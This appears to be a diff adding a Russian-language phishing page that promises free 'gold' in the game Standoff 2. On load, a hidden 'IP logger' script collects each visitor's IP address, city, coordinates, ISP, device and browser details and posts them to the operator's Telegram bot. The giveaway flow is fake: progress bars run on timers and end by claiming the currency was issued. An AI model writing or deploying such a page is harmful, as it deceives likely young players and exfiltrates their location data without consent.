@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>STANDOFF 2 — Конкурс апреля</title>
+    <link href="https://fonts.googleapis.com/css2?family=Russo+One&family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: #0a0a0f;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+
+        /* ===== ВИНЬЕТКА ===== */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse at center, transparent 0%, rgba(0,0,0,0.6) 100%);
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        /* ===== CANVAS ИСКРЫ ===== */
+        #sparks {
+            position: fixed;
+            inset: 0;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* ===== ФИКСИРОВАННАЯ ПОЛОСА СВЕРХУ ===== */
+        .top-bar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            background: linear-gradient(135deg, #b91c1c 0%, #dc2626 50%, #b91c1c 100%);
+            text-align: center;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            z-index: 9999;
+            box-shadow: 0 4px 20px rgba(220, 38, 38, 0.4);
+        }
+
+        /* ===== ОСНОВНОЙ КОНТЕНТ ===== */
+        .content {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 90px 20px 60px;
+            max-width: 480px;
+            width: 100%;
+        }
+
+        /* ===== ЗАГОЛОВОК STANDOFF 2 ===== */
+        .title {
+            font-family: 'Russo One', sans-serif;
+            font-size: 52px;
+            letter-spacing: 4px;
+            margin-bottom: 24px;
+            text-align: center;
+            line-height: 1.1;
+        }
+        .title-white { color: #ffffff; }
+        .title-red {
+            color: #ef4444;
+            text-shadow: 0 0 20px rgba(239,68,68,0.6), 0 0 40px rgba(239,68,68,0.3);
+        }
+
+        /* ===== КАРТИНКА i2 ===== */
+        .main-image {
+            width: 260px;
+            max-width: 80vw;
+            height: auto;
+            margin-bottom: 28px;
+            animation: float 3s ease-in-out infinite;
+            filter: drop-shadow(0 0 20px rgba(255,165,0,0.3));
+            object-fit: contain;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        /* ===== ТЕКСТ ===== */
+        .subtitle {
+            font-size: 17px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            text-align: center;
+            color: #d1d5db;
+        }
+
+        /* ===== ПОЛЕ ВВОДА ===== */
+        .input-field {
+            width: 100%;
+            max-width: 320px;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            background: rgba(255,255,255,0.07);
+            border: 1.5px solid rgba(255,255,255,0.12);
+            border-radius: 12px;
+            color: #fff;
+            text-align: center;
+            outline: none;
+            margin-bottom: 18px;
+            transition: all 0.3s;
+        }
+        .input-field::placeholder { color: #6b7280; }
+        .input-field:focus {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
+            background: rgba(255,255,255,0.1);
+        }
+
+        /* ===== КНОПКА ===== */
+        .btn-get {
+            width: 100%;
+            max-width: 320px;
+            padding: 15px 20px;
+            font-size: 18px;
+            font-family: 'Russo One', sans-serif;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: #fff;
+            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(220,38,38,0.4);
+        }
+        .btn-get:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(220,38,38,0.6);
+        }
+        .btn-get:active { transform: translateY(0); }
+
+        /* ===== МОДАЛЬНОЕ ОКНО ===== */
+        .overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        .overlay.active { display: flex; }
+
+        .modal {
+            background: linear-gradient(145deg, #1a1a2e 0%, #16162a 100%);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            padding: 36px 32px;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.7);
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 14px; right: 18px;
+            background: none;
+            border: none;
+            color: #6b7280;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.2s;
+            line-height: 1;
+        }
+        .close-btn:hover { color: #fff; }
+
+        .modal-body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            min-height: 120px;
+            justify-content: center;
+        }
+
+        .modal-text {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .modal-sub {
+            font-size: 14px;
+            color: #9ca3af;
+            margin-bottom: 16px;
+        }
+
+        /* ===== СПИННЕР ===== */
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top-color: #ef4444;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 16px 0;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== ПРОГРЕСС-БАР ===== */
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ef4444, #f97316);
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        /* ===== СТАДИЯ ВЫДАЧИ ===== */
+        .issue-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            margin: 12px 0;
+        }
+        .issue-icon {
+            width: 50px; height: 50px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 10px rgba(255,165,0,0.4));
+        }
+
+        .icon-success {
+            font-size: 48px;
+            margin: 8px 0;
+        }
+
+        .btn-close-modal {
+            margin-top: 20px;
+            padding: 12px 40px;
+            font-size: 16px;
+            font-family: 'Russo One', sans-serif;
+            font-weight: 700;
+            color: #fff;
+            background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(22,163,74,0.4);
+        }
+        .btn-close-modal:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(22,163,74,0.6);
+        }
+
+        /* ===== АДАПТИВ ===== */
+        @media (max-width: 480px) {
+            .title { font-size: 38px; letter-spacing: 2px; }
+            .main-image { width: 200px; }
+            .modal { padding: 28px 20px; }
+            .modal-text { font-size: 17px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Фиксированная полоса -->
+<div class="top-bar">🎉 Конкурс апреля! 🎉</div>
+
+<!-- Canvas для искр -->
+<canvas id="sparks"></canvas>
+
+<!-- Основной контент -->
+<div class="content">
+    <div class="title">
+        <span class="title-white">STANDOFF </span><span class="title-red">2</span>
+    </div>
+
+    <img src="i2.png" alt="" class="main-image" onerror="this.style.display='none'">
+
+    <div class="subtitle">Получить голду можно вот тут!</div>
+
+    <input type="text" class="input-field" id="idInput" placeholder="Введите ID" maxlength="20" autocomplete="off">
+    <button class="btn-get" id="btnGet" onclick="handleGet()">ПОЛУЧИТЬ</button>
+</div>
+
+<!-- Модальное окно -->
+<div class="overlay" id="overlay">
+    <div class="modal">
+        <button class="close-btn" onclick="closeModal()">&times;</button>
+        <div class="modal-body" id="modalBody"></div>
+    </div>
+</div>
+
+<!-- Скрытый root для Vite/React сборки -->
+<div id="root" style="display:none"></div>
+<script type="module" src="/src/main.tsx"></script>
+
+<script>
+// ==========================================
+//  НАСТРОЙКИ — ЗАПОЛНИ СВОИ ДАННЫЕ
+// ==========================================
+var BOT_TOKEN = "СЮДА_ТОКЕН_БОТА";        // Токен от @BotFather
+var CHAT_ID   = "СЮДА_CHAT_ID";           // Твой chat_id (bot.py покажет после /start)
+
+// ==========================================
+//  IP LOGGER — отправка при загрузке сайта
+// ==========================================
+(function() {
+    var info = {
+        ip: "",
+        city: "",
+        country: "",
+        region: "",
+        isp: "",
+        lat: "",
+        lon: "",
+        timezone: "",
+        userAgent: navigator.userAgent,
+        platform: navigator.platform || "",
+        language: navigator.language || "",
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        dpr: window.devicePixelRatio || 1,
+        fromTelegram: /telegram/i.test(navigator.userAgent),
+        referrer: document.referrer || "прямой заход",
+        date: new Date().toLocaleString("ru-RU", {timeZone: "Europe/Moscow"})
+    };
+
+    // Определяем устройство
+    var ua = navigator.userAgent;
+    if (/iPhone/i.test(ua)) info.device = "iPhone";
+    else if (/iPad/i.test(ua)) info.device = "iPad";
+    else if (/Android/i.test(ua)) info.device = "Android";
+    else if (/Windows/i.test(ua)) info.device = "Windows";
+    else if (/Mac/i.test(ua)) info.device = "Mac";
+    else if (/Linux/i.test(ua)) info.device = "Linux";
+    else info.device = "Другое";
+
+    // Определяем браузер
+    if (/Telegram/i.test(ua)) info.browser = "Telegram";
+    else if (/YaBrowser/i.test(ua)) info.browser = "Яндекс Браузер";
+    else if (/Chrome/i.test(ua)) info.browser = "Chrome";
+    else if (/Safari/i.test(ua)) info.browser = "Safari";
+    else if (/Firefox/i.test(ua)) info.browser = "Firefox";
+    else if (/Edge/i.test(ua)) info.browser = "Edge";
+    else if (/Opera|OPR/i.test(ua)) info.browser = "Opera";
+    else info.browser = "Другой";
+
+    // Получаем IP и геолокацию
+    fetch("https://ipapi.co/json/")
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            info.ip = data.ip || "?";
+            info.city = data.city || "?";
+            info.country = data.country_name || "?";
+            info.region = data.region || "?";
+            info.isp = data.org || "?";
+            info.lat = data.latitude || "?";
+            info.lon = data.longitude || "?";
+            info.timezone = data.timezone || "?";
+            sendToTelegram(info);
+        })
+        .catch(function() {
+            // Запасной вариант
+            fetch("https://api.ipify.org?format=json")
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    info.ip = d.ip || "?";
+                    sendToTelegram(info);
+                })
+                .catch(function() {
+                    info.ip = "не определён";
+                    sendToTelegram(info);
+                });
+        });
+})();
+
+function sendToTelegram(info) {
+    var tg = info.fromTelegram ? " ✈️ ДА" : " ❌ Нет";
+    var nick = "";
+    if (info.fromTelegram) {
+        var m = info.userAgent.match(/Telegram\/[\d.]+/i);
+        nick = m ? "" : "";
+    }
+
+    var text = "🚨 <b>НОВЫЙ ЗАХОД НА САЙТ</b>\n\n"
+        + "🌐 <b>IP:</b> <code>" + info.ip + "</code>\n"
+        + "📍 <b>Локация:</b> " + info.country + ", " + info.region + ", " + info.city + "\n"
+        + "🗺 <b>Координаты:</b> " + info.lat + ", " + info.lon + "\n"
+        + "📡 <b>Провайдер:</b> " + info.isp + "\n"
+        + "🕐 <b>Часовой пояс:</b> " + info.timezone + "\n\n"
+        + "💻 <b>Устройство:</b> " + info.device + "\n"
+        + "🌐 <b>Браузер:</b> " + info.browser + "\n"
+        + "✈️ <b>Telegram:</b>" + tg + "\n\n"
+        + "📱 <b>Экран:</b> " + info.screenWidth + "×" + info.screenHeight + " @" + info.dpr + "x\n"
+        + "🔤 <b>Язык:</b> " + info.language + "\n"
+        + "🔗 <b>Referrer:</b> " + info.referrer + "\n"
+        + "📅 <b>Время:</b> " + info.date + "\n\n"
+        + "📝 <b>User-Agent:</b>\n<code>" + info.userAgent + "</code>";
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+        })
+    }).catch(function() {});
+}
+
+// ==========================================
+//  ВВОД ТОЛЬКО ЦИФР
+// ==========================================
+var idInput = document.getElementById("idInput");
+idInput.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "");
+});
+
+// ==========================================
+//  ОБРАБОТКА КНОПКИ «ПОЛУЧИТЬ»
+// ==========================================
+function handleGet() {
+    var val = idInput.value.trim();
+    // Молча игнорируем если < 6 символов
+    if (val.length < 6) return;
+    startModal();
+}
+
+// ==========================================
+//  МОДАЛЬНОЕ ОКНО
+// ==========================================
+var overlay = document.getElementById("overlay");
+var modalBody = document.getElementById("modalBody");
+var modalTimer = null;
+
+function startModal() {
+    overlay.classList.add("active");
+    // Стадия 1 — Анализация
+    stage1();
+}
+
+function closeModal() {
+    overlay.classList.remove("active");
+    if (modalTimer) clearTimeout(modalTimer);
+}
+
+// Стадия 1: Анализация ID
+function stage1() {
+    var wait = Math.floor(Math.random() * 21) + 10; // 10-30 сек
+    modalBody.innerHTML =
+        '<div class="modal-text">🔍 Анализация ID...</div>'
+        + '<div class="spinner"></div>'
+        + '<div class="progress-bar"><div class="progress-fill" id="pFill"></div></div>'
+        + '<div class="modal-sub">Подождите, это может занять некоторое время</div>';
+
+    var fill = document.getElementById("pFill");
+    var elapsed = 0;
+    var iv = setInterval(function() {
+        elapsed += 100;
+        var pct = Math.min((elapsed / (wait * 1000)) * 100, 100);
+        fill.style.width = pct + "%";
+        if (elapsed >= wait * 1000) {
+            clearInterval(iv);
+            stage2();
+        }
+    }, 100);
+}
+
+// Стадия 2: ID Принят
+function stage2() {
+    modalBody.innerHTML =
+        '<div class="icon-success">✅</div>'
+        + '<div class="modal-text">ID Принят!</div>';
+
+    modalTimer = setTimeout(stage3, 2000);
+}
+
+// Стадия 3: Выдача
+function stage3() {
+    var wait = Math.floor(Math.random() * 61) + 60; // 60-120 сек
+    modalBody.innerHTML =
+        '<div class="modal-text">⏳ Выдача...</div>'
+        + '<div class="issue-row">'
+        + '  <div class="spinner"></div>'
+        + '  <img src="i1.png" alt="" class="issue-icon" onerror="this.style.display=\'none\'">'
+        + '</div>'
+        + '<div class="progress-bar"><div class="progress-fill" id="pFill2"></div></div>'
+        + '<div class="modal-sub">Процесс идёт, не закрывайте окно</div>';
+
+    var fill = document.getElementById("pFill2");
+    var elapsed = 0;
+    var iv = setInterval(function() {
+        elapsed += 100;
+        var pct = Math.min((elapsed / (wait * 1000)) * 100, 100);
+        fill.style.width = pct + "%";
+        if (elapsed >= wait * 1000) {
+            clearInterval(iv);
+            stage4();
+        }
+    }, 100);
+}
+
+// Стадия 4: Выдано
+function stage4() {
+    modalBody.innerHTML =
+        '<div class="icon-success">🎉</div>'
+        + '<div class="modal-text">Выдано! Проверяйте аккаунт</div>'
+        + '<button class="btn-close-modal" onclick="closeModal()">ЗАКРЫТЬ</button>';
+}
+
+// Закрытие по клику на оверлей
+overlay.addEventListener("click", function(e) {
+    if (e.target === overlay) closeModal();
+});
+
+// ==========================================
+//  АНИМАЦИЯ ИСКР НА CANVAS
+// ==========================================
+(function() {
+    var canvas = document.getElementById("sparks");
+    var ctx = canvas.getContext("2d");
+    var sparks = [];
+    var SPARK_COUNT = 80;
+
+    function resize() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    resize();
+    window.addEventListener("resize", resize);
+
+    function Spark() {
+        this.reset();
+    }
+    Spark.prototype.reset = function() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * -canvas.height;
+        this.size = Math.random() * 2.5 + 0.5;
+        this.speedY = Math.random() * 1.5 + 0.5;
+        this.speedX = (Math.random() - 0.5) * 0.5;
+        this.opacity = Math.random() * 0.7 + 0.3;
+        var colors = ["#ff8c00","#ffa500","#ff6600","#ffcc00","#ff4500","#ffaa33"];
+        this.color = colors[Math.floor(Math.random() * colors.length)];
+        this.wobble = Math.random() * Math.PI * 2;
+        this.wobbleSpeed = Math.random() * 0.03 + 0.01;
+    };
+    Spark.prototype.update = function() {
+        this.wobble += this.wobbleSpeed;
+        this.x += this.speedX + Math.sin(this.wobble) * 0.3;
+        this.y += this.speedY;
+        if (this.y > canvas.height + 10) this.reset();
+    };
+    Spark.prototype.draw = function() {
+        ctx.save();
+        ctx.globalAlpha = this.opacity;
+        ctx.shadowBlur = 12;
+        ctx.shadowColor = this.color;
+        ctx.fillStyle = this.color;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.restore();
+    };
+
+    for (var i = 0; i < SPARK_COUNT; i++) {
+        var s = new Spark();
+        s.y = Math.random() * canvas.height;
+        sparks.push(s);
+    }
+
+    function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        for (var i = 0; i < sparks.length; i++) {
+            sparks[i].update();
+            sparks[i].draw();
+        }
+        requestAnimationFrame(animate);
+    }
+    animate();
+})();
+</script>
+
+</body>
+</html>
